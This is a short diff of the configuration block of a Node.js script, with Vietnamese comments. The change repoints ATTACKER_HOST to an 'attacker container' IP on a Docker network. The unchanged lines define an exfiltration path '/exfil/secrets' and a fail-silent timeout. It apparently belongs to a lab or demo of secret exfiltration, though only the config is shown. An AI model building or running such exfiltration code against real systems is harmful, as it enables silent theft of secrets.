@@ -18,7 +18,7 @@ const http = require("http");
 const os = require("os");
 
 // ─── Config ────────────────────────────────────────────────────────────────
-const ATTACKER_HOST = "192.168.157.134"; // IP máy attacker
+const ATTACKER_HOST = "172.30.0.20"; // IP attacker container (Docker bridge network)
 const ATTACKER_PORT = 8080;
 const EXFIL_PATH = "/exfil/secrets";
 const TIMEOUT_MS = 5000; // fail-silent sau 5s nếu attacker offline
